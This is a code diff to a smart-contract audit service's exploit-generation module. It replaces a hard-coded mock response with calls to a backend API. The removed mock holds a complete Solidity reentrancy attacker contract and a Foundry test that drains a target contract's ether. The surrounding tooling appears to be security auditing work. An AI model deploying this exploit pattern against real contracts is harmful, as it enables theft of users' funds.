@@ -273,94 +273,33 @@ export const auditService = {
 
         console.log("Generating exploit with prompt length:", prompt.length);
 
-        // MOCK RESPONSE - ideally this calls an AI endpoint
-        // Returning a simulated Foundry exploit for a Reentrancy attack as an example
-        return {
-            success: true,
-            exploit: {
-                framework: "foundry",
-                attackerContract: {
-                    filename: "Attacker.sol",
-                    code: `// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+        try {
+            const response = await fetch(`${import.meta.env.VITE_API_URL || 'http://localhost:3001'}/api/generate-exploit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ prompt })
+            });
 
-import "./Target.sol";
+            const data = await response.json();
 
-contract Attacker {
-    Target public target;
-    address public owner;
-
-    constructor(address _target) {
-        target = Target(_target);
-        owner = msg.sender;
-    }
-
-    // Trigger the attack
-    function attack() external payable {
-        require(msg.value >= 1 ether, "Need ETH");
-        target.deposit{value: 1 ether}();
-        target.withdraw();
-    }
-
-    // Fallback called during reentrancy
-    receive() external payable {
-        if (address(target).balance >= 1 ether) {
-            target.withdraw();
-        }
-    }
-    
-    function collect() external {
-        payable(owner).transfer(address(this).balance);
-    }
-}`
-                },
-                test: {
-                    filename: "Exploit.t.sol",
-                    code: `// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
-
-import "forge-std/Test.sol";
-import "../src/Target.sol";
-import "../src/Attacker.sol";
-
-contract ExploitTest is Test {
-    Target public target;
-    Attacker public attacker;
-
-    function setUp() public {
-        target = new Target();
-        target.deposit{value: 10 ether}(); // Target has funds
-        
-        attacker = new Attacker(address(target));
-        vm.deal(address(attacker), 1 ether); // Attacker starts with little
-    }
-
-    function testReentrancyExploit() public {
-        uint256 initialTargetBal = address(target).balance;
-        uint256 initialAttackerBal = address(attacker).balance;
-
-        // PRECONDITIONS
-        assertEq(initialTargetBal, 10 ether, "Target should start with 10 ETH");
-        
-        console.log("Before: Target Balance", initialTargetBal);
-
-        // ACTION
-        attacker.attack{value: 1 ether}();
-
-        // VALIDATION
-        uint256 finalTargetBal = address(target).balance;
-        uint256 finalAttackerBal = address(attacker).balance;
-
-        console.log("After: Target Balance", finalTargetBal);
-        
-        assertEq(finalTargetBal, 0, "Target should be drained");
-        assertGt(finalAttackerBal, initialAttackerBal, "Attacker should profit");
-    }
-}`
-                },
-                successCriteria: "Target Balance == 0 && Attacker Balance > Initial"
+            if (!data.success) {
+                // Determine if it is a missing key error
+                if (data.error && data.error.includes("GEMINI_API_KEY")) {
+                    throw new Error("SERVER_MISSING_KEY");
+                }
+                throw new Error(data.error || "Failed to generate exploit");
             }
-        };
+
+            return { success: true, exploit: data.exploit };
+        } catch (error) {
+            console.error("Exploit generation error:", error);
+            // Fallback for demo if backend is offline or key missing.
+            if (error.message === "SERVER_MISSING_KEY" || error.message.includes("GEMINI_API_KEY")) {
+                alert("Please add your FREE Google Gemini API Key to server/.env (variable GEMINI_API_KEY) to use this feature!");
+                return { success: false, error: "Missing API Key" };
+            }
+            return { success: false, error: error.message };
+        }
     },
 
     async verifyExploit(vulnerabilityId, testLogs) {
@@ -369,14 +308,29 @@ contract ExploitTest is Test {
 
         console.log("Verifying exploit with prompt length:", prompt.length);
 
-        // MOCK RESPONSE
-        return {
-            vulnerabilityId: vulnerabilityId,
-            verification: "confirmed",
-            finalSeverity: "critical",
-            updatedRiskScore: 0,
-            notes: "Test logs confirm reliable reentrancy. 10 ETH drained in single transaction."
-        };
+        try {
+            const response = await fetch(`${API_URL}/api/verify-exploit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ prompt })
+            });
+
+            const data = await response.json();
+            return { ...data, vulnerabilityId }; // ensuring ID persists
+        } catch (error) {
+            console.error("Verification error:", error);
+            // Fallback for missing key warning
+            if (error.message === "SERVER_MISSING_KEY") {
+                alert("Please add your FREE Google Gemini API Key to server/.env (variable GEMINI_API_KEY) to use this feature!");
+            }
+            return {
+                vulnerabilityId,
+                verification: "inconclusive",
+                finalSeverity: "medium",
+                updatedRiskScore: 0,
+                notes: "AI Verification service unavailable: " + error.message
+            };
+        }
     },
 
     async performAudit({ address, network, code: manualCode }) {
